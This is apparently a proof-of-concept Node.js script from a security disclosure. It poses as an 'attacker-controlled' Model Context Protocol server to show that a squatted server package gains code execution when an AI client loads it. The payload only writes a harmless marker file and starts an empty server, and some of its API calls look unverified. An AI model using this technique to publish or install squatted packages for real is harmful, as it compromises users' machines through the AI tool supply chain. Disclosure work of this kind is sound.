#!/usr/bin/env node
import fs from "fs";
import path from "path";
import os from "os";

// ===================
// 1. POC CONFIRMATION
// ===================

console.log("🚨 POC Executed: Attacker-controlled MCP server is running.");

// Create a harmless file to prove execution
const filePath = path.join(os.tmpdir(), "poc_namespace_takeover.txt");
fs.writeFileSync(filePath, "POC SUCCESS: This code is running from the attacker-controlled MCP server.", "utf8");

console.log(`📁 Proof of execution written to: ${filePath}`);

// ===================
// 2. Minimal MCP server
// ===================
import { 
  Server,
  Credentials
} from "@modelcontextprotocol/sdk/server/index.js";

// Create a basic MCP server instance (empty functionality, only for validation)
const server = new Server(
  {
    name: "example-poc-server",
    version: "0.0.1"
  },
  {
    capabilities: {
      tools: {} // no tool actions; we only need code exec
    }
  }
);

// Handle connection attempts
server.setRequestHandler("initialize", async () => {
  console.log("🤖 MCP initialized request received");
  return {
    status: "success"
  };
});

// Optional: respond to credentials request
server.setRequestHandler("credentials", async (): Promise<Credentials> => {
  return {};
});

// ===================
// 3. Start server
// ===================
const useStdIO = process.argv.includes("--stdio");

if (useStdIO) {
  console.log("ℹ️ Starting server in stdio mode (typical local MCP)");
  await server.connectStdio();
} else {
  const port = process.env.PORT || "8081";
  console.log(`🌐 Starting server on port ${port}`);
  await server.connectHttp({ port: Number(port) });
}

console.log("🚀 MCP server started successfully!");
